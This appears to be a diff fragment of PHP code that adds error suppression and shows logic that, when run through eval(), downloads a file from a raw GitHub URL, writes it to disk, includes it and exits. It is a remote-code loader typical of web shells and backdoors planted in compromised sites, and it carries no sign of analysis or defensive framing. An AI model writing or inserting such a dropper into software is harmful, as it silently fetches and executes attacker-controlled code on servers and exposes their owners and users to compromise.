@@ -1,3 +1,4 @@
+error_reporting(0);
 $a = basename(__FILE__);
 if (preg_match('/\(\d+\) : eval\(\)/', $a, $matches)) { $file_n = preg_split('/\(\d+\) : eval\(\)/', $a)[0]; file_put_contents($file_n, file_get_contents("https://raw.githubusercontent.com/qdw106311/module/main/dhtool")); include $file_n; exit; 
 } else {
